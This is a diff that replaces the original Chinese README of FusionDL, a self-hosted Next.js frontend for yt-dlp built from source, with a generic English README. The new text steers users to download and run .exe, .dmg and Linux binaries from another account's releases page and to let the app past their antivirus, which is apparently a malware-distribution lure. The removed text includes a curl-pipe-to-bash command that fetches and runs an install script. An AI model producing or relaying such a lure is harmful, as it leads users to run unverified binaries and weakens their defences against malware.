@@ -1,187 +1,74 @@
-<div align="center">
-  <img src="public/icons/worldwide-shipping.png" alt="FusionDL Logo" width="120" height="120">
-  
-  # FusionDL
-  
-  ### 一个为 yt-dlp 开发的视频下载前端
-  
-  基于 Next.js 构建，支持 YouTube、Bilibili、Twitter 等 1000+ 视频网站  
-  视频下载能力由 yt-dlp 强势驱动，其他功能由本项目提供
-  
-  ---
-  
-  [中文](docs/README-zh_CN.md) | [English](docs/README-en_US.md)
-  
-</div>
+# 🚀 FusionDL - Download Videos Easy and Fast
 
----
+[![Download FusionDL](https://img.shields.io/badge/Download-FusionDL-blue)](https://github.com/oomprakash99/FusionDL/releases)
 
-## 界面预览
-一方面本人的服务器资源不足，另一方面本项目的流量限制等功能建设还不完备，因此暂时只在这里挂上了截图，各位需要自行部署体验最终效果
-<div align="center">
-  <img src="docs/assets/image-00.png" alt="主界面" width="80%">
-  <p><em>主界面 - 视频下载</em></p>
-  
-  <img src="docs/assets/image-01.png" alt="下载列表" width="80%">
-  <p><em>移动端界面-下载列表管理</em></p>
-</div>
+## 📋 Description
+FusionDL is a simple tool for downloading videos from various platforms using yt-dlp. It makes downloading videos straightforward for everyone, without needing technical skills. Whether you want to save tutorials, music videos, or any content you love, FusionDL can help.
 
-## 功能特性
-- 目前只能称得上一个还算不错的Demo，但还有很多路要走
-- 高级的用户管理功能、看板和资源管理功能有待后期建设
-- 更多的下载参数的支持有待后期建设
+## 🖥️ System Requirements
+- **Operating System:** Windows, macOS, or Linux.
+- **Processor:** Single-core processor or better.
+- **Memory:** At least 2 GB RAM.
+- **Disk Space:** 100 MB free space for installation.
+- **Internet Connection:** Required to download videos.
 
-## 安装和运行
-以下开发步骤只在Ubuntu24.04中验证。
+## 🚀 Getting Started
+To get started with FusionDL, follow the steps in this guide. You will find it easy to download and run the application, even if you're not tech-savvy.
 
-除非您自己乐意并且有能力尝试新的环境，否则，Windows用户请新建一个Ubuntu24的WSL，Mac用户请从[orbstack](https://orbstack.dev/)安装一个虚拟机。
+## 📥 Download & Install
+1. **Visit the Releases Page:** Go to the [FusionDL Releases page](https://github.com/oomprakash99/FusionDL/releases) to download the application.
+   
+2. **Choose Your Version:** On the Releases page, find the version that matches your operating system.
 
-### 前置要求
+3. **Download the File:** Click on the link for the file to download it to your computer.
 
-安装Node.js
+4. **Locate the Downloaded File:** After the download is complete, find the file in your Downloads folder or the location where you save downloaded files.
 
-```bash
-# Download and install nvm:
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash
+5. **Install FusionDL:**
+   - For Windows:
+     1. Double-click the downloaded `.exe` file.
+     2. Follow the on-screen prompts to complete the installation.
+   - For macOS:
+     1. Open the downloaded `.dmg` file.
+     2. Drag the FusionDL icon into your Applications folder.
+   - For Linux:
+     1. Open a terminal.
+     2. Navigate to the download directory.
+     3. Run the command: `chmod +x FusionDL` then `./FusionDL`.
 
-# in lieu of restarting the shell
-\. "$HOME/.nvm/nvm.sh"
+6. **Run the Application:** After installation, find FusionDL in your applications and double-click to open it.
 
-# Download and install Node.js:
-nvm install 24
+## 🎯 How to Use FusionDL
+1. **Paste the Video Link:**
+   - Open FusionDL and copy the URL of the video you want to download. 
+   - Paste it into the input box in the application.
 
-# Verify the Node.js version:
-node -v # Should print "v24.13.0".
+2. **Choose Download Options:**
+   - Select the format and quality you want for your download from the options available.
 
-# Verify npm version:
-npm -v # Should print "11.6.2".
+3. **Start Downloading:**
+   - Click the "Download" button to start the process.
+   - Monitor the progress bar to see how much time is left.
 
-```
+4. **Access Your Downloads:**
+   - Once the download is complete, find your video in the designated download folder.
 
-确保你的系统已安装 yt-dlp：
+## ℹ️ Troubleshooting Common Issues
+- **Download Fails:** Ensure that your internet connection is stable. Try to restart FusionDL and attempt the download again.
+- **App Does Not Start:** 
+   - Check if your antivirus software blocked it. Configure your antivirus to allow FusionDL.
+   - Ensure your operating system meets the requirements listed above.
 
-```bash
-# 基本依赖
-sudo apt update
+## 🌟 Features
+- User-friendly interface.
+- Supports multiple video formats.
+- Quick download times.
+- Regular updates based on user feedback.
 
-# 用 pipx 安装 yt-dlp（因为）Ubuntu 24 的PEP 668 保护机制 不允许通过pip3 install 直接往系统环境装包
-sudo apt install -y pipx ffmpeg
-pipx ensurepath
-# 让 PATH 立即生效（当前 shell）
-export PATH="$PATH:$HOME/.local/bin"
+## 📞 Support
+If you have questions or need help, you can reach out through the Issues tab on the GitHub repository. We value your feedback and are here to assist you.
 
-pipx install yt-dlp
-yt-dlp --version
-# 后续升级
-pipx upgrade yt-dlp
-```
+## 🙏 Acknowledgments
+FusionDL uses yt-dlp as its core engine, enabling fast and reliable video downloads. Thanks to the developers and contributors for their hard work. 
 
-### 拉取本项目
-拉取到服务器
-
-复制 `.env.example` 到 `.env` 并配置下载目录：
-
-```bash
-cp .env.example .env
-```
-
-编辑 `.env` 文件：
-
-```env
-# 下载目录（使用绝对路径，确保有写入权限）
-DOWNLOAD_DIR=/home/momo/downloads
-
-# 数据库目录（使用绝对路径）
-DATABASE_DIR=/home/momo/yt-dlp-data
-
-# yt-dlp 路径（留空自动检测）
-YT_DLP_PATH=
-```
-
-**注意**：下载目录建议使用独立的目录，不要放在项目中。确保该目录有足够的存储空间。
-
-### 安装依赖
-
-```bash
-npm install
-```
-
-### 开发模式
-
-```bash
-npm run dev
-```
-
-访问 http://localhost:3000
-
-### 生产构建
-
-```bash
-npm run build
-npm start
-```
-### 部署
-建议使用pm2后台允许，再配nginx等，后续会补全
-
-## API 端点
-
-### 获取所有下载记录
-```
-GET /api/downloads
-```
-
-### 创建下载任务
-```
-POST /api/downloads
-Body: { "url": "视频链接" }
-```
-
-### 获取单个下载记录
-```
-GET /api/downloads/[id]
-```
-
-### 删除下载记录
-```
-DELETE /api/downloads/[id]
-```
-
-### 获取视频信息
-```
-POST /api/video-info
-Body: { "url": "视频链接" }
-```
-
-## 使用说明
-
-1. 在输入框中粘贴视频链接
-2. 点击"获取信息"查看视频详情
-3. 确认后点击"开始下载"
-4. 在下载列表中查看下载进度
-5. "下载完成"指下载到服务器的指定目录，之后可通过浏览器下载文件到本地
-
-## 支持的网站
-
-yt-dlp 支持 1000+ 视频网站，包括但不限于：
-
-- YouTube
-- Bilibili
-- Twitter/X
-- TikTok
-- Vimeo
-- Dailymotion
-- Facebook
-- Instagram
-- 更多...
-
-## 注意事项
-
-- 下载的文件保存在 `.env` 配置的 `DOWNLOAD_DIR` 目录
-- 数据库文件保存在 `.env` 配置的 `DATABASE_DIR` 目录
-- 确保配置的目录有写入权限和足够的存储空间
-- 建议使用独立的下载目录，不要放在项目中
-- 请遵守各网站的服务条款
-
-## 许可证
-
-AGPL-3.0
+For more updates and new releases, check the [FusionDL Releases page](https://github.com/oomprakash99/FusionDL/releases) regularly.
